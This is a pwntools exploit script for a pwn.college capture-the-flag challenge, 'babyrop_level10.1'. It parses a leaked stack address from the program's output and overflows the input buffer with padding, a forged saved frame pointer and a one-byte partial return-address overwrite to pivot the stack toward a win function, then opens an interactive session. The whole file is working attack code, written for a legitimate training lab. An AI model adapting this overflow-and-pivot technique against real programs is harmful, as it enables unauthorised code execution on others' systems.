from pwn import *
context.binary=e=ELF("./babyrop_level10.1")
libc=e.libc
gs="""
b *challenge+236
"""
if args.DEBUG:
    context.log_level='debug'
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.SSH:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyrop_level10.1")
p.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
buffer_locate=int(p.recv(12).decode(),16)
log.info(f"{hex(buffer_locate)}")
win_func_locate=buffer_locate-8
p.send(b"A"*(0x60-8)+p64(win_func_locate-8)+b"\x47")
p.interactive()